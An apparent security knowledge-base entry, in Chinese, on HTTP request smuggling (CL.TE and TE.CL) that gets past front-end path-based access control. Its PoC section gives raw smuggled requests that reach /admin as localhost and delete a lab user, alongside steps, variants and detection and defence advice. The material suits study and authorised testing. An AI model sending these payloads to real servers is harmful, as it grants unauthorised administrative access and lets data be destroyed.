---
id: web-generic-http-smuggling-front-end-acl-bypass-smuggled-request
title: '请求走私绕过前端访问控制：把带 Host: localhost 的 GET /admin 藏进 chunk，并用尾部 Content-Length 吸收后续请求头'
type: scenario
domain: web
path: web/generic/http-smuggling
technique: request-smuggling-front-end-acl-bypass
aliases:
- 请求走私绕过前端 ACL
- bypass front-end controls smuggling
- 走私访问 admin
- Host localhost 走私
- 重复 Host 头规避
tags:
- http-smuggling
- access-control-bypass
- cl-te
- te-cl
- host-header
- admin-panel
- http1
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V614
  verified_at: '2026-11-12T20:50:43+08:00'
  notes: '已对照原文『走私绕过-前端限制』CL.TE/TE.CL 两节及图23-37核对：CL.TE 首次 GET /admin 返回 only available to local users，加 Host: localhost 触发 Duplicate header names are not allowed，改为 CL 116 + 尾部 Content-Length: 10 后进入 Admin panel 并 delete carlos；TE.CL 变体 87 + GET /admin/delete... 与图32-37一致。参数、Host、尾部吸收头机制均与原文/截图吻合。未验证点：未本机复跑；无 sources；无版本/CVE。dedup：empty-cl-chunked-admin-bypass 为空 CL 自动填充机制，CL.0/H2 亦不同，非同链，保留。'
---

## 一句话结论

前端只按它看到的外层请求做路径 ACL（如拦截 `/admin`），攻击者用 CL.TE/TE.CL 把完整的 `GET /admin HTTP/1.1` 走私到后端连接上，前端放行外层请求、后端却按内部请求执行，从而访问管理面板；当后端要求 `Host: localhost` 时，可通过在走私请求尾部声明 Content-Length 把后续正常请求的头吸收为 body，避免重复 Host 被前端拒绝。

## 原理

- 访问控制常放在前端：代理看到路径是 `/home` 就转发，看到 `/admin` 就返回 403/blocked；后端默认"请求既然到了我这里，一定已通过前端检查"。
- 走私请求对外层前端不可见：前端只解析并审计它转发的那一个请求，chunk 内/CL 之后的第二个请求由后端独立解析，因此后端不会再次经过前端 ACL。
- 后端若限制管理面板仅允许本地访问（依据 `Host` 或内部 IP 头），就在走私请求里自带 `Host: localhost` 或对应内部头。
- 难点是前端可能拒绝重复 `Host` 头（外层请求已有宿主 Host）。技巧是在走私请求末尾写一个较小的 `Content-Length: 10`，使后端把紧接着到达的正常请求的请求行与头当作这个参数值读取，而不是拼成新的请求头；这样走私请求内部的 Host 生效，后续请求头被"吃掉"，不会产生重复 Host。
- 外层请求本身可以是一个无害路径（如 `/` 或 `/home`），前端 ACL 完全看不到被走私的 `/admin`。

## 触发条件

- 前端按路径/方法做 ACL，后端没有同等的独立鉴权。
- 存在 CL.TE 或 TE.CL 解析差异，且前后端连接可复用。
- 后端管理端点的访问控制依赖 `Host`/内部头而非独立会话认证（常见于靶场与内网应用）。
- 前端允许 CL+TE 并存或 TE 混淆写法，未在转发前规范化。

## 利用步骤

1. 确认前端拦截：直接访问 `/admin` 得到 blocked/403，而走私一个 `GET /admin HTTP/1.1` 后，后端返回"仅限本地访问"等不同错误，说明请求已到达后端。
2. CL.TE 初次尝试：`Content-Length` 覆盖整包，正文 `0\r\n\r\nGET /admin HTTP/1.1\r\nX-Ignore: X`，连发两次使第二个请求被拼接。
3. 若后端要求本地访问，在走私请求中加入 `Host: localhost`；若前端报 `Duplicate header names are not allowed`，改为在走私请求末尾加 `Content-Length: 10` 与空行，把后续正常请求头吸收为 body。
4. TE.CL 变体：前端按 chunked 截断、后端按 CL 读取，chunk 内写 `POST /admin HTTP/1.1\r\nHost: localhost\r\n...`，`Content-Length` 只覆盖 chunk 首行。
5. 进入管理面板后，用同样的走私手法请求删除/添加用户的接口（如 `/admin/delete?username=carlos`），完成越权操作。

## PoC

CL.TE（用尾部 CL 吸收后续请求头，避免重复 Host）：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

随后在同一连接发送任意正常请求，其请求头会被当作 `x=` 的值吸收，`GET /admin` 随后端连接执行。删除用户时把路径改为 `/admin/delete?username=carlos` 并相应调整外层 `Content-Length`。

TE.CL 变体：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

说明：`87` 为 chunk 长度十六进制；外层 CL 只覆盖 `87\r\n`。两种变体的长度字段均需按实际报文重新计算。PoC 为靶场流程的结构化复现，未在本机执行，仅用于授权测试。

## 变体与关联

- 变体：把 `/admin` 换成任意被前端拦截的内部路径、API、调试端点；把 `Host: localhost` 换成 `X-Forwarded-For`、内部认证头等后端信任的字段。
- 变体：重复 Host 被前端拒绝时，除尾部 CL 吸收外，还可尝试把 Host 放到被走私请求的绝对 URI 中，或利用前端不校验尾部的特性。
- 关联：[[web-generic-http-smuggling-cl-te-basic-chunk-prefix]]、[[web-generic-http-smuggling-te-cl-basic-chunk-prefix]]（原语）、[[web-generic-http-smuggling-empty-cl-chunked-admin-bypass]]（另一种空 CL 形态的同类 ACL 绕过）、[[web-generic-http-smuggling-front-end-rewrite-probe-header-spoof]]（绕过依赖前端重写头的本地限制）。
- 边界：后端对 `/admin` 做独立鉴权、前端拒绝 CL+TE 或重复头、后端不复用连接时，本链不成立。

## 检测与防御

- 检测：前端日志只有 `/` 或 `/home`，后端日志出现 `/admin`；同一连接出现两个请求而代理只记录一个；请求体中出现完整 `GET /admin HTTP/1.1` 请求行；重复 Host/异常 CL。
- 防御：后端对所有敏感端点做独立鉴权与授权，不信任"来自前端即已认证"；拒绝 CL+TE 并存、重复 Host、异常长度；前端重新序列化请求；禁用后端连接复用。
- 加固：管理面与业务面网络隔离；使用签名令牌而非可伪造的 Host/内部头；部署 desync 检测与前后端日志比对。
